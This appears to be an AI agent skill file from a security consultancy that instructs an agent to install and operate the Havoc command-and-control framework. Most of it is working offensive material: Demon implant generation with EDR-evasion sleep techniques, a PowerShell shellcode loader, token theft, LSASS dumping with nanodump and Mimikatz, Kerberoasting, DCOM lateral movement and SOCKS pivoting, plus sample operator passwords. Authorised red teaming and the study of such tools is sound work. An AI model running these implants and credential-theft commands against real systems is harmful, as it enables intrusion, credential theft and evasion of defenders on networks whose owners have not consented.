---
name: havoc-c2
description: >
  Build, extend, and operate Havoc C2 — a modern command-and-control framework featuring
  the Demon agent. Use when deploying Havoc on red team engagements, when the user needs
  to set up a teamserver, generate implants, configure listeners, or execute post-exploitation
  tasks. Covers installation, teamserver profiles, client setup, Demon agent generation,
  HTTP/HTTPS listeners, agent command reference, BOF integration, process injection, token
  manipulation, .NET execution, and comparison with Sliver and Cobalt Strike.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/HavocFramework/Havoc
  stars: '7.8k'
---

# havoc-c2 Agent Skill

## When to Use This Skill

Use this skill when:
- Setting up a Havoc C2 teamserver for a red team engagement
- Generating Demon implants (EXE, DLL, shellcode, service EXE)
- Configuring HTTP/HTTPS listeners with custom profiles
- Executing post-exploitation commands via the Demon agent
- Loading BOFs (Beacon Object Files) for in-memory execution
- The user asks about Havoc compared to Cobalt Strike or Sliver

## What Havoc C2 Does

Havoc is an open-source, modern C2 framework that uses the Demon agent — a stageless, reflective DLL-based implant. The teamserver is written in Go and the client in C++/Qt. Demon supports BOF execution, process injection, token manipulation, .NET CLR hosting, and SOCKS5 proxying. It is actively developed at `HavocFramework/Havoc` with ~7.8k GitHub stars.

## Installation

### Prerequisites
```bash
# Kali/Ubuntu/Debian
sudo apt update && sudo apt install -y \
  golang-go \
  mingw-w64 \
  nasm \
  python3-pip \
  build-essential \
  cmake \
  libssl-dev \
  libffi-dev

# Qt5 for the client UI
sudo apt install -y \
  qt5-qmake \
  qtbase5-dev \
  qtchooser \
  qt5-qmake \
  qtbase5-dev-tools \
  libqt5websockets5-dev
```

### Clone and Build
```bash
git clone https://github.com/HavocFramework/Havoc.git /opt/havoc
cd /opt/havoc

# Build the teamserver
cd teamserver
go mod download
go build -o havoc . 

# Build the client (requires Qt)
cd ../client
mkdir build && cd build
cmake ..
make -j$(nproc)
# Binary: /opt/havoc/client/build/Havoc

# Verify builds
/opt/havoc/teamserver/havoc --help
/opt/havoc/client/build/Havoc --help
```

### Python Modules for Extender
```bash
pip3 install havoc pyhavoc
```

## Teamserver Setup

### Profile Structure
Havoc uses YAML profiles to configure the teamserver. Default profile at `/opt/havoc/profiles/`:

```yaml
# /opt/havoc/profiles/havoc.yaotl  (HCL-like format)
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
        Compiler86 = "i686-w64-mingw32-gcc"
        Nasm       = "/usr/bin/nasm"
    }
}

Operators {
    user "admin" {
        Password = "Passw0rd!"
    }
    user "operator1" {
        Password = "SecretPass1!"
    }
}

Listeners {
    Http {
        Name         = "HTTP Listener"
        Hosts        = ["0.0.0.0"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 80
        PortConn     = 80
        Secure       = false
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Headers      = ["Content-type: */*", "Connection: keep-alive"]
        Uris         = ["/updates", "/download", "/api/v1/data"]
        Response {
            Headers  = ["Content-type: application/octet-stream", "Connection: keep-alive"]
        }
    }
}
```

### Starting the Teamserver
```bash
cd /opt/havoc/teamserver

# Start with profile
./havoc server --profile /opt/havoc/profiles/havoc.yaotl

# Debug mode (verbose logging)
./havoc server --profile /opt/havoc/profiles/havoc.yaotl --debug

# Background service
nohup ./havoc server --profile /opt/havoc/profiles/havoc.yaotl \
  &>/var/log/havoc_teamserver.log &
echo "Teamserver PID: $!"
```

### HTTPS Listener with Custom Certificate
```yaml
# Add to profile Listeners block
Listeners {
    Http {
        Name         = "HTTPS Listener"
        Hosts        = ["0.0.0.0"]
        HostBind     = "0.0.0.0"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        Cert         = "/etc/ssl/certs/operator.crt"
        Key          = "/etc/ssl/private/operator.key"
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Uris         = ["/cdn-cgi/", "/static/", "/wp-admin/"]
        Response {
            Headers  = ["Content-type: application/octet-stream"]
        }
    }
}
```

Generate self-signed cert:
```bash
openssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/private/operator.key \
  -out /etc/ssl/certs/operator.crt -days 365 -nodes \
  -subj "/C=US/ST=VA/L=McLean/O=Acme Corp/CN=cdn.target.com"
```

## Client Connection

```bash
# Launch GUI client
/opt/havoc/client/build/Havoc

# Connect dialog:
# Host: teamserver IP or hostname
# Port: 40056 (default)
# User: admin (from profile)
# Password: Passw0rd! (from profile)
```

## Listener Configuration (UI)

1. Havoc Client → View → Listeners → Add
2. Select Type: `HTTP` or `HTTPS`
3. Configure Name, Host, Port, URIs, User-Agent, Headers
4. Save → Listener appears in sidebar

## Demon Agent Generation

### Via UI
1. Attack → Payload → Demon
2. Select Listener from dropdown
3. Configure:
   - **Format**: Windows EXE / Windows DLL / Shellcode / Windows Service EXE
   - **Architecture**: x64 / x86
   - **Config** tab: Sleep (seconds), Jitter (%), Sleep technique
4. Generate → Downloads payload to local machine

### Demon Configuration Options
```
Sleep           Default C2 check-in interval (seconds, e.g., 5)
Jitter          Randomization % (e.g., 20 = 4-6 second actual interval)
Indirect Syscall  Bypass EDR hooks via indirect syscalls (recommended)
Sleep Technique   Obfuscation during sleep: WaitForSingleObjectEx, Ekko, Zilean
Injection        Process injection method: VirtualAllocEx, NtMapViewOfSection
Proxy            SOCKS5 proxy for egress
```

### Sleep Technique Details
| Technique | Description | EDR Evasion |
|-----------|-------------|-------------|
| WaitForSingleObjectEx | Basic sleep | Low |
| Ekko | ROP-based sleep encryption | High |
| Zilean | Timer-based sleep with heap encryption | High |

### Shellcode Generation and Injection
```bash
# After generating shellcode from UI, use external injector:
# Example: inject via PowerShell reflective loader
$sc = [System.IO.File]::ReadAllBytes("demon.bin")
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
$thr = [Havoc.Native]::CreateThread(0, 0, $mem, 0, 0, 0)
[Havoc.Native]::WaitForSingleObject($thr, 0xFFFFFFFF)
```

## Demon Agent Commands

### Core Session Commands
```
help                    List available commands
sleep <sec> <jitter>    Update check-in interval (e.g., sleep 30 20)
checkin                 Force immediate check-in
exit                    Terminate agent gracefully
kill <pid>              Kill a process by PID
getpid                  Get current process PID
getuid                  Get current user/UID
getsystem               Attempt SYSTEM token impersonation
```

### Shell Execution
```
shell <command>              Execute via cmd.exe /c (artifacts on disk: cmd.exe)
powershell <command>         Execute via PowerShell (AMSI/CLM risk)
shellcode inject <pid> <file>  Inject shellcode into target PID
```

### File Operations
```
upload <local> <remote>     Upload file to target
download <remote>           Download file from target
ls [path]                   List directory
cd <path>                   Change directory
mkdir <path>                Create directory
rm <path>                   Delete file
cat <path>                  Read file contents
```

### Process Operations
```
ps                          List running processes (PID, name, arch, session, user)
kill <pid>                  Terminate process
inject <pid> <shellcode>    Inject shellcode into existing process
spawn <binary>              Spawn a new process (for injection)
```

### Token Manipulation
```
token list                  List available tokens (stolen/impersonated)
token steal <pid>           Steal token from process PID
token impersonate <pid>     Impersonate token from PID
token make <user> <pass> <domain>  Create token with credentials
token revert                Revert to original token
token privs                 List token privileges
whoami /all                 Display full token info (via shell)
```

### .NET and CLR Execution
```
dotnet <assembly.exe> [args]  Execute .NET assembly in memory (CLR hosting)
# Example: run SharpHound in memory
dotnet SharpHound.exe -c all --zipfilename results.zip
dotnet Rubeus.exe kerberoast /outfile:hashes.txt
dotnet Certify.exe find /vulnerable
```

### BOF (Beacon Object File) Integration
```
bof <bof_file.o> [args]     Execute BOF in current process
# Example BOFs:
bof /opt/bofs/situational_awareness/whoami.o
bof /opt/bofs/credentials/seatbelt.o -group=system
```

Compatible BOF repositories:
- `trustedsec/CS-Situational-Awareness-BOF`
- `outflanknl/helperlib`
- `kyleavery/inject-assembly`

### Network and Reconnaissance
```
netstat                     List network connections
arp                         Display ARP table
ipconfig                    Display network interfaces
reg query <key>             Query Windows registry
sc query                    List services
tasklist                    List processes with details (via shell)
```

### Lateral Movement (via shell/dotnet)
```
# Pass-the-Hash via token + Impacket-style
shell net use \\TARGET\C$ /user:DOMAIN\admin <hash> (token must be NTLM)

# PsExec-style via process injection into remote host
dotnet Invoke-TheHash.exe (or SharpExec)

# DCOM lateral movement
shell powershell -c "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET')).Document.ActiveView.ExecuteShellCommand('cmd',0,'calc.exe','7')"
```

### SOCKS5 Proxy
```
socks5 start <port>         Start SOCKS5 proxy (e.g., socks5 start 1080)
socks5 stop                 Stop SOCKS5 proxy
```
Pair with Proxychains:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

proxychains nmap -sT -p 445,80,443 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

## Post-Exploitation Workflows

### Initial Access → Privilege Escalation
```bash
# 1. Check current token
> whoami /all         (via shell command)
> token privs

# 2. Try getsystem
> getsystem

# 3. If fails, dump tokens
> token list
> token steal <winlogon_or_lsass_pid>

# 4. If UAC bypass needed (run from user context)
> dotnet Seatbelt.exe TokenPrivileges
> shell powershell -c "Invoke-TokenImpersonation -CreateProcess..."
```

### Credential Harvesting
```
# Dump LSASS via BOF (EDR-safe method)
bof /opt/bofs/nanodump/nanodump.o --fork --write /tmp/lsass.dmp

# Parse with pypykatz (offline)
pypykatz lsa minidump /tmp/lsass.dmp

# In-memory LSASS parsing via dotnet
dotnet Mimikatz.exe "sekurlsa::logonpasswords" "exit"

# SAM dump
dotnet Mimikatz.exe "token::elevate" "lsadump::sam" "exit"
```

### Domain Enumeration
```
dotnet SharpHound.exe -c all --zipfilename bh_$(date +%Y%m%d).zip
# Transfer zip: download bh_20241201.zip
# Import into BloodHound
```

## Comparison with Sliver and Cobalt Strike

| Feature | Havoc | Sliver | Cobalt Strike |
|---------|-------|--------|---------------|
| License | Open Source | Open Source (BishopFox) | Commercial ($6.5k+) |
| Agent | Demon (C) | Implant (Go) | Beacon (C) |
| GUI | Qt5 Client | Web UI | Java Client |
| BOF Support | Yes (CS-compatible) | Yes (COFF) | Yes (native) |
| Sleep Obfuscation | Ekko, Zilean | WireGuard beacon | Sleep mask |
| .NET Execution | Inline CLR | inline-dotnet | execute-assembly |
| Maturity | Newer (2022+) | Mature | Mature (2012+) |
| Detection Signature | Lower (newer) | Medium | High (many sigs) |
| OPSEC | Good | Good | Variable |
| Multi-team | Yes (teamserver) | Yes | Yes |

## Troubleshooting

**Teamserver won't start — port in use**
```bash
ss -tlnp | grep 40056
# Change Port in profile or kill conflicting process
```

**Client can't connect to teamserver**
```bash
# Check firewall
ufw allow 40056/tcp
# Verify teamserver is listening
ss -tlnp | grep 40056
# Check teamserver log for TLS/auth errors
```

**Demon not calling back**
- Verify listener is running in the UI
- Check that PortBind and PortConn match
- Test connectivity: `curl -A "Mozilla/5.0" http://TEAMSERVER_IP/updates`
- Check Windows Defender / EDR on target is not blocking
- Try different sleep technique (WaitForSingleObjectEx is least suspicious)

**BOF execution crashes agent**
- Ensure BOF is compiled for same arch as Demon (x64 vs x86)
- Use `bof` only after verifying it's a valid COFF object: `file bof.o`
- Test with a simple BOF (whoami) before complex ones

**dotnet assembly fails**
- Target must have .NET Framework version matching assembly target
- Use `shell powershell -c "[Environment]::Version"` to check .NET version
- Compile with correct framework target (`-framework:net40`)

**Build fails — Go module errors**
```bash
cd /opt/havoc/teamserver
go clean -modcache
go mod tidy
go mod download
go build -o havoc .
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
